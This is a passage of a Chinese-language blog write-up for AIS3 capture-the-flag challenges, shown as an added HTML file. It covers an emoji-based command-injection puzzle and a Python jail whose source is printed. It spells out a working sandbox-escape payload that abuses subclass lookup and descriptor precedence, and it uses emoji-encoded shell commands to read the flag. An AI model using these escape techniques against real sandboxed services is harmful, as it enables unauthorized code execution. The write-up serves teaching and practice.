+    <span class="string">&quot;🚢&quot;</span>: <span class="string">&quot;ship&quot;</span>,
+    <span class="string">&quot;👨&quot;</span>: <span class="string">&quot;man&quot;</span>,
+    <span class="string">&quot;👩&quot;</span>: <span class="string">&quot;woman&quot;</span>,
+    <span class="string">&quot;👶&quot;</span>: <span class="string">&quot;baby&quot;</span>,
+    <span class="string">&quot;🧓&quot;</span>: <span class="string">&quot;old man&quot;</span>,
+    <span class="string">&quot;👵&quot;</span>: <span class="string">&quot;old woman&quot;</span>,
+    <span class="string">&quot;💿&quot;</span>: <span class="string">&quot;CD&quot;</span>,
+    <span class="string">&quot;📀&quot;</span>: <span class="string">&quot;DVD&quot;</span>,
+    <span class="string">&quot;📱&quot;</span>: <span class="string">&quot;phone&quot;</span>,
+    <span class="string">&quot;💻&quot;</span>: <span class="string">&quot;laptop&quot;</span>,
+    <span class="string">&quot;🖥️&quot;</span>: <span class="string">&quot;pc&quot;</span>,
+    <span class="string">&quot;🖨️&quot;</span>: <span class="string">&quot;printer&quot;</span>,
+    <span class="string">&quot;⌨️&quot;</span>: <span class="string">&quot;keyboard&quot;</span>,
+    <span class="string">&quot;🖱️&quot;</span>: <span class="string">&quot;mouse&quot;</span>,
+    <span class="string">&quot;🖲️&quot;</span>: <span class="string">&quot;trackball&quot;</span>,
+    <span class="string">&quot;🕹️&quot;</span>: <span class="string">&quot;joystick&quot;</span>,
+    <span class="string">&quot;🗜️&quot;</span>: <span class="string">&quot;clamp&quot;</span>,
+    <span class="string">&quot;💾&quot;</span>: <span class="string">&quot;floppy disk&quot;</span>,
+    <span class="string">&quot;💽&quot;</span>: <span class="string">&quot;minidisc&quot;</span>,
+    <span class="string">&quot;☎️&quot;</span>: <span class="string">&quot;telephone&quot;</span>,
+    <span class="string">&quot;📟&quot;</span>: <span class="string">&quot;pager&quot;</span>,
+    <span class="string">&quot;📺&quot;</span>: <span class="string">&quot;television&quot;</span>,
+    <span class="string">&quot;📻&quot;</span>: <span class="string">&quot;radio&quot;</span>,
+    <span class="string">&quot;🎙️&quot;</span>: <span class="string">&quot;studio microphone&quot;</span>,
+    <span class="string">&quot;🎚️&quot;</span>: <span class="string">&quot;level slider&quot;</span>,
+    <span class="string">&quot;🎛️&quot;</span>: <span class="string">&quot;control knobs&quot;</span>,
+    <span class="string">&quot;⏰&quot;</span>: <span class="string">&quot;alarm clock&quot;</span>,
+    <span class="string">&quot;🕰️&quot;</span>: <span class="string">&quot;mantelpiece clock&quot;</span>,
+    <span class="string">&quot;⌚&quot;</span>: <span class="string">&quot;watch&quot;</span>,
+    <span class="string">&quot;📡&quot;</span>: <span class="string">&quot;satellite antenna&quot;</span>,
+    <span class="string">&quot;🔋&quot;</span>: <span class="string">&quot;battery&quot;</span>,
+    <span class="string">&quot;🔌&quot;</span>: <span class="string">&quot;plug&quot;</span>,
+    <span class="string">&quot;🚩&quot;</span>: <span class="string">&quot;flag&quot;</span>,
+    <span class="string">&quot;⓿&quot;</span>: <span class="string">&quot;0&quot;</span>,
+    <span class="string">&quot;❶&quot;</span>: <span class="string">&quot;1&quot;</span>,
+    <span class="string">&quot;❷&quot;</span>: <span class="string">&quot;2&quot;</span>,
+    <span class="string">&quot;❸&quot;</span>: <span class="string">&quot;3&quot;</span>,
+    <span class="string">&quot;❹&quot;</span>: <span class="string">&quot;4&quot;</span>,
+    <span class="string">&quot;❺&quot;</span>: <span class="string">&quot;5&quot;</span>,
+    <span class="string">&quot;❻&quot;</span>: <span class="string">&quot;6&quot;</span>,
+    <span class="string">&quot;❼&quot;</span>: <span class="string">&quot;7&quot;</span>,
+    <span class="string">&quot;❽&quot;</span>: <span class="string">&quot;8&quot;</span>,
+    <span class="string">&quot;❾&quot;</span>: <span class="string">&quot;9&quot;</span>,
+    <span class="string">&quot;❿&quot;</span>: <span class="string">&quot;10&quot;</span>,
+    <span class="string">&quot;⭐&quot;</span>: <span class="string">&quot;*&quot;</span>,
+    <span class="string">&quot;➕&quot;</span>: <span class="string">&quot;+&quot;</span>,
+    <span class="string">&quot;➖&quot;</span>: <span class="string">&quot;-&quot;</span>,
+    <span class="string">&quot;✖️&quot;</span>: <span class="string">&quot;×&quot;</span>,
+    <span class="string">&quot;➗&quot;</span>: <span class="string">&quot;÷&quot;</span>
+
+&#125;cat: flag: Is a directory
+cat: templates: Is a directory
+</code></pre>
+
+
+<p>現在我們得到一個json有所有指令的對照表，並且可以知道flag應該是在 <code>flag</code> 的資料夾。</p>
+<p>嘗試 <code>cat</code> flag 資料夾裡面的東西，可以從剛剛 dump 出來的 json 找可以用的指令，這邊使用<code>;/</code>和<code>:|</code>切割指令，回傳的結果似乎是一個 python file</p>
+<pre><code class="highlight bash">💿 🚩😓😑🐱 ⭐ <span class="comment">#cd flag;/:|</span></code></pre>
+
+
+<pre><code class="highlight python"><span class="comment">#flag-printer.py</span>
+
+<span class="built_in">print</span>(<span class="built_in">open</span>(<span class="string">&#x27;/flag&#x27;</span>,<span class="string">&#x27;r&#x27;</span>).read())</code></pre>
+
+<ol start="3">
+<li>執行python，get flag<pre><code class="highlight bash">💿 🚩😓😑🐍❸ 🚩➖🖨️⭐</code></pre></li>
+</ol>
+<blockquote>
+<p>AIS3{🫵🪡🉐🤙🤙🤙👉👉🚩👈👈}</p>
+</blockquote>
+<h2 id="Can-you-describe-Pyjail"><a href="#Can-you-describe-Pyjail" class="headerlink" title="Can you describe Pyjail?"></a>Can you describe Pyjail?</h2><blockquote>
+<p>Yet another 🐍 ⛓️.<br>nc chals1.ais3.org 48763<br>Author: Vincent55</p>
+</blockquote>
+<p>這題不是我出的，但是 Vincent 大佬出的題目還是要捧場一下</p>
+<h3 id="source-code"><a href="#source-code" class="headerlink" title="source code"></a>source code</h3><p>看source code可以知道是很純的pyjail，在 <code>safe_eval</code> 裡面就把該 ban 的都 ban 光了</p>
+<p><del>跟前面那題 evil calculator 比起來 calculator 一點都不 evil</del></p>
+<pre><code class="highlight python"><span class="comment">#!/usr/local/bin/python3</span>
+
+<span class="keyword">from</span> safe_eval <span class="keyword">import</span> safe_eval
+<span class="keyword">from</span> inspect <span class="keyword">import</span> getdoc
+
+
+<span class="keyword">class</span> <span class="title class_">Desc</span>:
+    <span class="string">&quot;&quot;&quot;</span>
+<span class="string">    Welcome to my 🐍 ⛓️</span>
+<span class="string">    &quot;&quot;&quot;</span>
+
+    <span class="keyword">def</span> <span class="title function_">__get__</span>(<span class="params">self, objname, obj</span>):
+        <span class="keyword">return</span> <span class="built_in">__import__</span>(<span class="string">&quot;conf&quot;</span>).flag
+
+    <span class="keyword">def</span> <span class="title function_">desc_helper</span>(<span class="params">self, name</span>):
+        origin = <span class="built_in">getattr</span>(<span class="built_in">type</span>, name)
+        <span class="keyword">if</span> origin == <span class="built_in">type</span>.__getattribute__:
+            <span class="keyword">raise</span> NameError(
+                <span class="string">&quot;Access to forbidden name %r (%r)&quot;</span> % (name, <span class="string">&quot;__getattribute__&quot;</span>)
+            )
+        <span class="variable language_">self</span>.helper = origin
+
+
+<span class="keyword">class</span> <span class="title class_">Test</span>:
+    desc = Desc()
+
+
+test = Test()
+test.desc = <span class="string">&quot;flag&#123;fakeflag&#125;&quot;</span>
+
+
+<span class="comment"># Just a tricky way to print a welcome message, or maybe a hint :/</span>
+<span class="comment"># You can just `print(getdoc(Desc))`</span>
+<span class="comment"># This is not part of the challenge, but if you can get the flag through here, please contact @Vincent55.</span>
+welcome_msg = <span class="string">&quot;&quot;&quot;</span>
+<span class="string">desctmp := Desc()</span>
+<span class="string">desctmp.desc_helper(&quot;__base__&quot;)</span>
+<span class="string">Obj := desctmp.helper</span>
+<span class="string">desctmp := Desc()</span>
+<span class="string">desctmp.desc_helper(&quot;__subclasses__&quot;)</span>
+<span class="string">print(getdoc(desctmp.helper(Obj)[-2]))</span>
+<span class="string">&quot;&quot;&quot;</span>.strip().replace(<span class="string">&quot;\n&quot;</span>, <span class="string">&quot;,&quot;</span>)
+welcome_msg = <span class="string">f&quot;(<span class="subst">&#123;welcome_msg&#125;</span>)&quot;</span>
+
+safe_eval(
+    welcome_msg,
+    &#123;<span class="string">&quot;__builtins__&quot;</span>: &#123;&#125;&#125;,
+    &#123;<span class="string">&quot;Desc&quot;</span>: Desc, <span class="string">&quot;print&quot;</span>: <span class="built_in">print</span>, <span class="string">&quot;getdoc&quot;</span>: getdoc&#125;,
+)
+
+
+<span class="comment"># Your challenge begin here!</span>
+payload = <span class="built_in">input</span>(<span class="string">&quot;✏️: &quot;</span>)
+
+safe_eval(
+    payload,
+    &#123;<span class="string">&quot;__builtins__&quot;</span>: &#123;&#125;&#125;,
+    &#123;<span class="string">&quot;Desc&quot;</span>: Desc&#125;,
+)
+
+<span class="comment"># print(f&quot;test.__dict__: &#123;test.__dict__&#125;&quot;)</span>
+<span class="built_in">print</span>(<span class="string">f&quot;🚩: <span class="subst">&#123;test.desc&#125;</span>&quot;</span>)
+</code></pre>
+
+<p>看完 source code 可以發現他在print <code>welcome_msg</code> 的時候用了一個非常詭異的方法，也算是這題的題示。</p>
+<h3 id="welcome-msg到底在幹嘛"><a href="#welcome-msg到底在幹嘛" class="headerlink" title="welcome_msg到底在幹嘛"></a>welcome_msg到底在幹嘛</h3><p>首先看到下面這段程式碼：</p>
+<pre><code class="highlight python">welcome_msg = <span class="string">&quot;&quot;&quot;</span>
+<span class="string">desctmp := Desc()</span>
+<span class="string">desctmp.desc_helper(&quot;__base__&quot;)</span>
+<span class="string">Obj := desctmp.helper</span>
+<span class="string">desctmp := Desc()</span>
+<span class="string">desctmp.desc_helper(&quot;__subclasses__&quot;)</span>
+<span class="string">print(getdoc(desctmp.helper(Obj)[-2]))</span>
+<span class="string">&quot;&quot;&quot;</span>.strip().replace(<span class="string">&quot;\n&quot;</span>, <span class="string">&quot;,&quot;</span>)
+welcome_msg = <span class="string">f&quot;(<span class="subst">&#123;welcome_msg&#125;</span>)&quot;</span>
+
+safe_eval(
+    welcome_msg,
+    &#123;<span class="string">&quot;__builtins__&quot;</span>: &#123;&#125;&#125;,
+    &#123;<span class="string">&quot;Desc&quot;</span>: Desc, <span class="string">&quot;print&quot;</span>: <span class="built_in">print</span>, <span class="string">&quot;getdoc&quot;</span>: getdoc&#125;,
+)</code></pre>
+<p>其實會發現你可以透過 <code>getattr(type, name)</code> 取得<code>type</code>底下的attribute<br>這裡會卡一個知識點，就是當你要取得某個 class 的 subclass 的時候(假設是 str )，會寫 <code>str.__subclasses__()</code> ，但其實可以寫成 <code>type.__subclasses__(str)</code> ，前提是 <code>str</code> 的 <code>class</code> 必須是 <code>type</code></p>
+<p><strong>所以我們可以先透過 <code>getattr(type,&quot;__subclasses__&quot;)</code> 取得 <code>type.__subclasses__</code> 再把 <code>__base__</code> 塞進去就可以得到 <code>type.__base__.__subclasses__()</code></strong></p>
+<p>好到這邊大家應該已經搞懂上面那陀 <code>welcome_msg</code> 的 payload 到底在幹嘛了，簡單來說就是到 <code>object</code> 裡面把所有 class 抓出來，然後抓倒數第2個 <code>class</code> (<code>jail.Desc</code>)把它印出來</p>
+<h3 id="解題"><a href="#解題" class="headerlink" title="解題"></a>解題</h3><p>一開始想改抓 <code>jail.Test</code> 下面的 <code>desc</code> 就可以拿到 <code>flag</code> 了<br>抓是抓得到，但是print不出來啊</p>
+<pre><code class="highlight python">a = Desc();a.desc_helper(<span class="string">&quot;__base__&quot;</span>);obj=a.helper;a = Desc();a.desc_helper(<span class="string">&quot;__subclasses__&quot;</span>);obj = a.helper(obj)[-<span class="number">1</span>].desc</code></pre>
+
+<p>這邊又卡一個知識點了，那就是 <strong>python 的 descriptor 解析有優先度的問題</strong>(題目有提示describe，雖然我覺得沒有人看得懂)</p>
+<p>以下參考 @Vincent550102 的筆記：</p>
+<blockquote>
+<ul>
+<li>如果 __get__ 與 __set__ 都有，優先使用描述器（Descriptor）：<br>當一個描述器同時實現了 __get__ 和 __set__ 方法時，Python 會認為它是一個資料描述器（Data Descriptor）。資料描述器的一個特點是它們對屬性的訪問有更高的優先級。<br>如果不是，則在自己的 __dict__ 裡面找：</li>
+<li>如果描述器沒有作為資料描述器或者只實現了 __get__ 方法的非資料描述器（Non-Data Descriptor）或者找不到描述器，Python 會繼續在物件的 __dict__ 屬性字典中尋找是否存在該屬性。</li>
+<li>若在 __dict__ 也找不到，嘗試用描述器的 __get__：<br>如果在物件的 <strong>dict</strong> 中找不到該屬性，Python 會檢查是否存在只實現了 <strong>get</strong> 方法的非資料描述器，如果存在，則回傳該描述器的 __get__ 方法。<br>都沒有，直接回傳描述器：</li>
+<li>如果上述步驟都無法找到該屬性，最後會返回描述器物件本身，如果連描述器也不存在，則會拋出 AttributeError。</li>
+</ul>
+</blockquote>
+<p>看到這邊，問題已經變很簡單了，那就是<strong>我們需要將 <code>__get__</code> 變成最高優先級</strong>，此時後面就算 fake_flag 把 <code>test.desc</code> 蓋掉也沒有用，仍然會回傳 <code>Test.__get__()</code> 的內容</p>
+<p>如何將 <code>__get__</code> 變成最高優先級呢？<strong>只要新增一個 <code>__set__</code> 就行了</strong></p>
+<pre><code class="highlight python">func = <span class="keyword">lambda</span> <span class="variable language_">self</span>,obj,val:<span class="literal">None</span>
+desc.__setattr__(<span class="string">&quot;__set__&quot;</span>,func)</code></pre>
+
+<pre><code class="highlight python"><span class="comment">#payload</span>
+(a := Desc(),a.desc_helper(<span class="string">&quot;__base__&quot;</span>),obj:=a.helper,a := Desc(),a.desc_helper(<span class="string">&quot;__subclasses__&quot;</span>),desc:=a.helper(obj)[-<span class="number">2</span>],a:=Desc(),a.desc_helper(<span class="string">&quot;__setattr__&quot;</span>),func:=<span class="keyword">lambda</span> <span class="variable language_">self</span>,obj,val:<span class="literal">None</span>,a.helper(desc,<span class="string">&quot;__set__&quot;</span>,func))</code></pre>
+<blockquote>
+<p>AIS3{y0u_kn0w_h0w_d35cr1p70r_w0rk!}</p>
+</blockquote>
+</main>
+
+</article>
+
+
+<script src="/js/highlight.js"></script>
+
+  </main>
+  <footer class="footer">
+  
+  <span>Copyright © TriangleSnake</span>
+  
+</footer>
+  
+<script src="/js/theme.js"></script>
+
+</body>
+
+</html>
